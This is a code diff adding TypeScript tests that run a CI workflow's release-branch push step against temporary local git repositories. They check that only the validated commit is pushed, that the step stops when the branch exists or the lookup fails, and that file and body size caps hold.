+// branch lookup must see "no such branch" (exit 2) to push, and anything else stops the job.
+describe("the push job's push step, run for real", () => {
+    const script = stepOf(push, "Push the release branch only").run!;
+    const git = (cwd: string, ...args: string[]) => {
+        const done = spawnSync("git", args, {
+            cwd,
+            encoding: "utf8",
+            env: {
+                PATH: process.env.PATH!,
+                GIT_AUTHOR_NAME: "t",
+                GIT_AUTHOR_EMAIL: "t@e.x",
+                GIT_COMMITTER_NAME: "t",
+                GIT_COMMITTER_EMAIL: "t@e.x",
+                HOME: tmpdir(),
+                GIT_CONFIG_GLOBAL: "/dev/null",
+            },
+        });
+        if (done.status !== 0) throw new Error(`git ${args.join(" ")}: ${done.stderr}`);
+        return done.stdout.trim();
+    };
+
+    function pushOutcome(
+        setup: { exists?: boolean; badRemote?: boolean; tagExists?: boolean } = {},
+    ) {
+        const dir = mkdtempSync(path.join(tmpdir(), "push-"));
+        const remote = path.join(dir, "remote.git");
+        git(dir, "init", "-q", "--bare", remote);
+        const work = path.join(dir, "work");
+        mkdirSync(work);
+        git(work, "init", "-q", "-b", "main");
+        writeFileSync(path.join(work, "a"), "a\n");
+        git(work, "add", "-A");
+        git(work, "commit", "-qm", "base");
+        const commit = git(work, "rev-parse", "HEAD");
+        git(
+            work,
+            "remote",
+            "add",
+            "origin",
+            setup.badRemote ? path.join(dir, "missing.git") : remote,
+        );
+        if (setup.exists) {
+            writeFileSync(path.join(work, "b"), "b\n");
+            git(work, "add", "-A");
+            git(work, "commit", "-qm", "other");
+            git(work, "push", "-q", remote, "HEAD:refs/heads/release/0.1.0");
+            git(work, "reset", "-q", "--hard", commit);
+        }
+        const done = spawnSync("bash", ["-e", "-o", "pipefail", "-c", script], {
+            cwd: work,
+            encoding: "utf8",
+            env: {
+                PATH: process.env.PATH!,
+                HOME: tmpdir(),
+                GIT_CONFIG_GLOBAL: "/dev/null",
+                GH_TOKEN: "token",
+                COMMIT: commit,
+                VERSION: "0.1.0",
+            },
+        });
+        const refs = git(remote, "for-each-ref", "--format=%(refname) %(objectname)");
+        rmSync(dir, { recursive: true, force: true });
+        return { code: done.status, out: `${done.stdout}${done.stderr}`, refs, commit };
+    }
+
+    it("pushes the validated commit to the release branch only, and no tag", () => {
+        const done = pushOutcome();
+        expect(done.code).toBe(0);
+        expect(done.refs).toBe(`refs/heads/release/0.1.0 ${done.commit}`);
+    });
+
+    it("stops when the branch exists already, leaving it as it was", () => {
+        const done = pushOutcome({ exists: true });
+        expect(done.code).not.toBe(0);
+        expect(done.out).toContain("exists already, or the lookup failed (exit 0)");
+        expect(done.refs).not.toContain(done.commit);
+    });
+
+    it("stops when the lookup itself fails, instead of treating it as no such branch", () => {
+        const done = pushOutcome({ badRemote: true });
+        expect(done.code).not.toBe(0);
+        expect(done.out).toContain("the lookup failed (exit 128)");
+    });
+});
+
+describe("the other checks of the privilege split", () => {
+    it("caps the body size in open-pr and every file in push at the tooling's value", () => {
+        expect(stepOf(openPr, "Check the body").run).toMatch(/-le 65000 \]/);
+        expect(stepOf(push, "Validate the release data").run).toContain(`max=${MAX_FILE_BYTES}`);
+        expect(65000).toBeLessThan(65536);
+    });
+});
